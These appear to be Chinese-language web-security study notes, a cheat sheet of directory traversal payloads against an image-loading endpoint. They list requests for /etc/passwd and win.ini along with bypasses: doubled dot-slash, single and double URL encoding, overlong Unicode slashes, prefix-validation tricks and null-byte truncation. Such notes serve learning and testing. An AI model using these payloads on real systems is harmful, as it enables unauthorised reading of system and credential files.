# Directory Traversal
## 情境
* 使用 `/image?filename=x.png` 取得圖片。
```
<img src="/image?filename=218.png">
```
* 圖片所在位置。
```
/var/www/images/218.png
```
## 相對路徑
* linux
```
/image?filename=../../../etc/passwd
```
* windows
```
/image?filename=..\..\..\windows\win.ini
```
## 絕對路徑
```
/image?filename=/etc/passwd
```
## 過濾單一路徑
* 如果只是單純過濾掉`../`，可以用以下方法bypass。
```
....//
```
```
....\/
```
## URL 編碼
* URL encoding `../` 的結果。
```
%2e%2e%2f
```
* 2次URL encoding `../` 的結果。
```
%252e%252e%252f
```
## Unicode 編碼
* `%c0%af` 會替換成 `/` ([原理](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work))。
```
..%c0%af
```
## 路徑起始驗證
```
/var/www/images/../../../etc/passwd
```
## 檔名驗證
* 使用 `%00` 來中斷路徑，藉此逃脫檔名驗證。
```
%00
```
---
###### tags: `web security`